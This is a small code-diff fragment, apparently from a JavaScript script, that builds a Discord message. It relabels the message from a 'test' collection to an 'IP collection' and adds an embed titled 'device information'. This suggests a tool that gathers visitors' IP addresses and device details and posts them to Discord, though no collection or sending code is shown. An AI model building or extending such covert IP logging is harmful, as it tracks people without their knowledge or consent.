@@ -18,7 +18,7 @@
 
   // Monta mensagem para Discord
   const payload = {
-    content: "**Nova coleta de teste:**",
+    content: "**Nova coleta de IP:**",
     embeds: [
       {
         title: "Informações do Dispositivo",
